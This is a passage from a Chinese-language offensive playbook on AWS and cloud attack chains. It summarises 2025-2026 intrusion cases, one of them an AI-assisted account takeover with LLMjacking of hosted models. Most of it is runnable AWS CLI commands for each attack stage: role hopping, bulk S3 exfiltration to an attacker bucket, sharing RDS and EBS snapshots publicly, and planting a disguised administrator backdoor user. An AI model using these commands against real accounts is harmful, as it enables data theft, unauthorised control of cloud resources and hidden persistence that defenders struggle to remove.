## 五、云原生完整攻击链（元数据→IAM横向→数据泄露→权限提升）

### 5.1 攻击链总览

```
┌─────────────┐   ┌──────────────┐   ┌────────────────┐   ┌────────────┐
│ 初始入口     │ → │ 身份获取      │ → │ 枚举与权限提升  │ → │ 数据窃取   │
│ (SSRF/泄露  │   │ (IMDS凭据/   │   │ (IAM提权路径/  │   │ (S3批量拉取│
│  AK/钓鱼)   │   │  AK/会话令牌) │   │  角色横跳)     │   │  /复制/     │
└─────────────┘   └──────────────┘   └────────────────┘   │  快照导出)  │
                                                          └────────────┘
```

### 5.2 实战攻击链案例复盘（2025-2026）

**案例A：8分钟 AI 辅助云接管（Sysdig 2026.02 复盘）**
```
1. 初始入口：公开S3桶中的RAG数据文件包含AWS凭据（AI/ML管道资产=凭据藏身处）
2. 枚举：GetServiceQuota/GetCallerIdentity 摸清环境与配额（先规划再行动）
3. 权限提升：利用过度授权的Lambda执行角色注入AI生成代码
4. 横向移动：6个IAM角色横跳、跨14个会话、19个AWS主体
5. 数据窃取+资源滥用：未经授权调用9个Bedrock基础模型（LLMjacking）+尝试开GPU实例
6. 持久化：创建后门账号
7. 痕迹特征：代码含LLM生成的异常处理模式、幻觉URL、session名含"claude-session"
```

**案例B：UNC6426 OIDC 供应链链（Google/Mandiant H1 2026）**
```
1. 供应链：s1ngularity npm恶意包偷开发者的GitHub token（含AI工具凭据）
2. 身份滥用：用GitHub token触发GitHub Actions → 滥用过宽GitHub→AWS OIDC信任
3. 提权：CloudFormation IAM能力允许低权限角色创建"继任者"管理员角色
4. 数据窃取：从S3桶批量外传文件
5. 结论：无0day、无新型恶意软件，三个"常见但很少被串联"的配置缺陷=完全云接管
```

**案例C：10分钟加密挖矿（Qualys 2026.07）**
```
泄露AK → 枚举（GetServiceQuota了解配额）→ EC2/ECS部署挖矿 → Lambda持久化，10分钟内完成
```

### 5.3 攻击链各环节实战要点

**环节1：横向移动（IAM角色横跳）**
```bash
# 列出可Assume的角色
aws iam list-roles --query 'Roles[].Arn'
# 尝试AssumeRole（逐个测试信任策略）
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevAdmin --role-session-name pwn
# 跨账号横跳（组织内账号角色链）
aws sts assume-role --role-arn arn:aws:iam::987654321098:role/OrgAdmin --role-session-name pwn
# 云上横向的本质：不是网络层，而是"身份信任关系图"
```

**环节2：数据窃取手段**
```bash
# S3 批量下载（大桶注意限速与日志规避）
aws s3 sync s3://target-bucket/ ./dump/ --no-sign-request

# 大规模外传首选：S3复制到攻击者桶（不留本地流量）
aws s3 cp s3://victim/data s3://attacker/data --recursive

# RDS/数据库导出
aws rds create-db-snapshot --db-instance-identifier target-db --db-snapshot-identifier pwn
aws rds restore-db-instance-from-db-snapshot ... # 或直接共享快照
aws rds modify-db-snapshot-attribute --db-snapshot-identifier pwn --attribute-name restore --values-to-add all

# EBS快照/AMI导出
aws ec2 create-snapshot --volume-id vol-xxx
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids all

# 日志数据：CloudTrail/应用日志中的敏感字段
```

**环节3：持久化手段**
```bash
# 1. 创建隐藏IAM用户/角色（vsCode-lambda等拟态命名）
aws iam create-user --user-name "backup-svc-2026"
aws iam attach-user-policy --user-name backup-svc-2026 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. 修改现有角色信任策略
aws iam update-assume-role-policy --role-name AppRole --policy-document file://trust.json

# 3. 创建Lambda定时任务（EventBridge触发，天然隐蔽）
# 4. EC2 UserData后门：每次重装自动执行
# 5. 创建访问密钥替代轮换（CreateAccessKey生成新AK，绕过原凭据轮换）
# 6. 阿里云/Azure：RAM用户/服务主体 + 条件访问策略污染
```

